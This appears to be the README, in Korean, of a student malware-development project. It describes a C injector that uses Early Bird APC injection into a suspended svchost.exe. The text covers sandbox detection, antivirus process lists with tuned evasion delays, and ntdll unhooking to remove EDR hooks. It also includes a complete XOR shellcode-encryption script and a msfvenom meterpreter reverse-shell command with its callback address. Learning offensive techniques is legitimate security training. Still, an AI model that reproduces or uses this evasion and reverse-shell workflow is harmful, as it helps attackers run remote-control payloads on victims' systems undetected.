# AEBAPCv3 - Early Bird APC Injection

> 화이트햇 스쿨 사이드 프로젝트 | Maldev Academy  
> 버전: v3 | 빌드 환경: Visual Studio 2022 x64

---

## 개요

**Early Bird APC Injection** 기법을 구현한 C 기반 인젝터.  
svchost.exe를 정지(SUSPENDED) 상태로 생성한 직후, 엔트리 포인트가 실행되기 전에 셸코드를 APC 큐에 삽입하여 백신 훅이 초기화되기 전에 실행시킨다.

| 항목 | 값 |
|------|-----|
| XOR 복호화 키 | `0x41` |
| 대상 프로세스 | `C:\Windows\System32\svchost.exe` |
| 셸코드 파일 | `shellcode.bin` (XOR 0x41 암호화) |
| 빌드 대상 | x64 |

---

## 버전별 기능

| 버전 | 기능 |
|------|------|
| **v1** | 샌드박스 탐지 회피 |
| **v2** | 백신 프로세스 탐지 + 지터(Jitter) 딜레이 |
| **v3** | ntdll 언후킹 (EDR 훅 제거) |

---

## 동작 흐름

```
[v1] 샌드박스 탐지
        ↓
[v2] 백신 프로세스 스캔 → 지터 딜레이 계산
        ↓
[v3] ntdll .text 섹션 언후킹
        ↓
Sleep(jitter)
        ↓
shellcode.bin 로드 → XOR 복호화
        ↓
CreateProcessA(CREATE_SUSPENDED)  ← svchost.exe 정지 상태 생성
        ↓
VirtualAllocEx(PAGE_EXECUTE_READWRITE)
        ↓
WriteProcessMemory
        ↓
VirtualProtectEx(PAGE_EXECUTE_READ)  ← RWX → RX
        ↓
QueueUserAPC → ResumeThread
        ↓
SecureZeroMemory + HeapFree  ← 로컬 버퍼 안전 삭제
```

---

## v1 - 샌드박스 탐지

두 가지 방식으로 샌드박스 환경을 탐지한다.

### 1. Sleep 스킵 탐지
- `10,000ms` Sleep 실행 후 실제 경과 시간 측정
- 경과 시간이 `9,000ms` 미만이면 샌드박스가 Sleep을 가속한 것으로 판단 → 즉시 종료

### 2. CPU 루프 가속 탐지
- 5억 회 반복 연산 실행 후 경과 시간 측정
- 경과 시간이 `500ms` 미만이면 CPU가 에뮬레이션 중인 것으로 판단 → 즉시 종료

---

## v2 - 백신 탐지 및 지터 딜레이

`CreateToolhelp32Snapshot`으로 실행 중인 프로세스를 전체 스캔한 뒤,  
아래 AV 프로파일 테이블과 대조하여 백신별 최적 지터 시간을 적용한다.

### 백신 프로파일 테이블

| 백신 | 탐지 프로세스 | Base (ms) | Range (ms) |
|------|-------------|-----------|------------|
| **Windows Defender** | `MsMpEng.exe`, `MpCmdRun.exe`, `SecurityHealthSvc.exe` | 5000 | 2000 |
| **AVAST** | `avastsvc.exe`, `AvastUI.exe`, `afwServ.exe` | 4200 | 900 |
| **Kaspersky** | `avp.exe`, `avpui.exe`, `klnagent.exe`, `kavtray.exe` | 7500 | 2500 |
| **Bitdefender** | `bdagent.exe`, `vsserv.exe`, `bdservicehost.exe`, `bdredline.exe` | 8500 | 2500 |
| **알약 (ALYac)** | `ALYac.exe`, `ESTsvc.exe`, `ayagent.aye`, `ESTCommon.exe` | 3500 | 1500 |
| **nProtect (INCA)** | `nprotect.exe`, `npkcmsvc.exe`, `npkcmsvc32.exe`, `TachyonAgent.exe` | 3000 | 1500 |
| **기본값 (미탐지)** | — | 6000 | 3000 |

### 지터 시간 근거

| 백신 | 이유 |
|------|------|
| **Bitdefender (8500ms)** | 클라우드 위협 조회 네트워크 왕복 딜레이 |
| **Kaspersky (7500ms)** | BSS 행위 기반 분석 엔진 처리 시간 |
| **Defender (5000ms)** | AMSI + ETW 실시간 이벤트 처리 시간 |
| **AVAST (4200ms)** | 경량 CommunityIQ 엔진, 로컬 스캔 위주 |
| **알약 (3500ms)** | 시그니처 기반 위주, 행위 분석 깊이 낮음 |
| **nProtect (3000ms)** | 온라인 뱅킹 보호 중심, PE 행위 분석 약함 |

### CPU 부하 보정

- `GetSystemTimes`로 500ms 구간 CPU 사용률 측정
- CPU 사용률 **30% 미만**이면 지터에 `+1500ms` 추가  
  *(시스템이 한가할수록 백신 스캔 여유가 늘어나므로)*

```
최종 지터 = Base + rand(Range) [+ 1500ms if CPU < 30%]
```

---

## v3 - ntdll 언후킹

AV/EDR은 `ntdll.dll`의 `.text` 섹션 내 syscall 앞에 `JMP` 명령을 삽입하여 API 호출을 후킹한다.  
언후킹은 디스크의 깨끗한 `ntdll.dll`로 해당 섹션을 덮어써서 훅을 제거한다.

### 언후킹 절차

```
1. C:\Windows\System32\ntdll.dll  →  CreateFile + MapViewOfFile (읽기 전용)
                                       ↓
2. GetProcAddress / PE Header 파싱으로 .text 섹션 위치 확인
                                       ↓
3. VirtualProtect(.text, RWX)         ← 보호 속성 해제
                                       ↓
4. memcpy(로드된 ntdll .text ← 디스크 ntdll .text)
                                       ↓
5. VirtualProtect(.text, 원래 속성)   ← 복원
                                       ↓
결과: AV가 삽입한 JMP 훅 제거 → 원본 syscall 직접 실행
```

---

## 셸코드 준비 - encrypt.py 사용법

인젝터는 XOR 0x41로 암호화된 `shellcode.bin`을 기대한다.  
Cobalt Strike / msfvenom 등에서 뽑은 원본 셸코드는 아래 절차로 암호화한다.

### encrypt.py 코드

```python
# encrypt.py
# 사용법: python encrypt.py <원본 셸코드 파일> [출력 파일명]
# XOR 키 0x41 로 암호화하여 shellcode.bin 생성

import sys

XOR_KEY = 0x41

def encrypt(input_path, output_path):
    with open(input_path, "rb") as f:
        data = f.read()

    encrypted = bytes([b ^ XOR_KEY for b in data])

    with open(output_path, "wb") as f:
        f.write(encrypted)

    print(f"[+] Input  : {input_path} ({len(data)} bytes)")
    print(f"[+] Output : {output_path} ({len(encrypted)} bytes)")
    print(f"[+] XOR key: 0x{XOR_KEY:02X}")
    print(f"[+] Done.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: python encrypt.py <input> [output]")
        sys.exit(1)

    input_file  = sys.argv[1]
    output_file = sys.argv[2] if len(sys.argv) >= 3 else "shellcode.bin"
    encrypt(input_file, output_file)
```

### 전체 준비 흐름

```
[1] C2 서버에서 셸코드 생성
        ↓
[2] encrypt.py 로 XOR 0x41 암호화
        ↓
[3] shellcode.bin 을 AEBAPCv3.exe 와 같은 폴더에 배치
        ↓
[4] AEBAPCv3.exe 실행
```

### 단계별 명령 예시

**① msfvenom으로 raw 셸코드 생성 (예시)**

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f raw -o raw_shellcode.bin
```

**② encrypt.py 로 암호화**

```cmd
python encrypt.py raw_shellcode.bin shellcode.bin
```

출력 예시:
```
[+] Input  : raw_shellcode.bin (510 bytes)
[+] Output : shellcode.bin (510 bytes)
[+] XOR key: 0x41
[+] Done.
```

**③ 파일 배치**

```
C:\whitehat school\
├── AEBAPCv3.exe      ← 빌드된 인젝터
├── shellcode.bin     ← 암호화된 셸코드  ★ 여기에 복사
└── encrypt.py        ← 암호화 스크립트 (선택)
```

**④ 실행**

```cmd
AEBAPCv3.exe
```

### 주의사항

| 항목 | 내용 |
|------|------|
| XOR 키 불일치 | `encrypt.py`의 `XOR_KEY`와 `AEBAPCv3.c`의 `XOR_KEY` 가 반드시 `0x41`로 동일해야 함 |
| 파일명 | 인젝터는 `shellcode.bin` 고정으로 읽음. 다른 이름이면 오작동 |
| 파일 위치 | `shellcode.bin`은 `AEBAPCv3.exe`와 **같은 폴더**에 있어야 함 |
| 재암호화 | 셸코드를 교체할 때마다 `encrypt.py`를 다시 실행해야 함 |
| Python 버전 | Python 3.x 권장 |

---

## 빌드 방법

### 환경 요구사항

| 항목 | 값 |
|------|-----|
| IDE | Visual Studio 2022 |
| 컴파일러 | x64 Native Tools Command Prompt |
| SDK | Windows SDK |
| 언어 | C (ASCII only) |

### 빌드 명령

```cmd
:: x64 Native Tools Command Prompt 실행 후

cd "C:\whitehat school"

cl.exe AEBAPCv3.c /Fe:AEBAPCv3.exe /link kernel32.lib advapi32.lib
```

### 필요 파일

```
C:\whitehat school\
├── AEBAPCv3.c
└── shellcode.bin    ← XOR 0x41 암호화된 셸코드 (실행 전 같은 폴더에 배치)
```

---

## 콘솔 출력 예시

```
[*] Checking sandbox environment...
[+] Sandbox check passed.
[*] Scanning for AV processes...
[+] Detected AV: Windows Defender (MsMpEng.exe)
[*] Jitter base: 5000ms, range: 2000ms
[*] CPU usage: 12% -> adding +1500ms
[*] Final jitter: 6347ms
[*] Unhooking ntdll.dll...
[+] ntdll .text section unhooked successfully.
[*] Sleeping 6347ms...
[*] Loading shellcode from shellcode.bin...
[+] Shellcode loaded: 512 bytes
[*] Decrypting shellcode (XOR 0x41)...
[+] Decryption complete.
[*] Launching target process (SUSPENDED)...
[+] Process created. PID: 4892
[*] Allocating memory in target process...
[+] Memory allocated at: 0x00000234ABCD0000
[*] Writing shellcode to target process...
[+] WriteProcessMemory OK.
[*] Applying memory protection (RX)...
[*] Queuing APC...
[*] Resuming thread...
[+] Injection complete.
```

---

## 테스트 대상 백신

- Windows Defender
- AVAST
- Kaspersky
- Bitdefender
- 알약 (ALYac / ESTsecurity)
- nProtect (INCA Internet)

---

> **주의:** 이 코드는 화이트햇 스쿨 교육 목적의 사이드 프로젝트입니다.  
> 허가되지 않은 시스템에 사용하는 것은 불법입니다.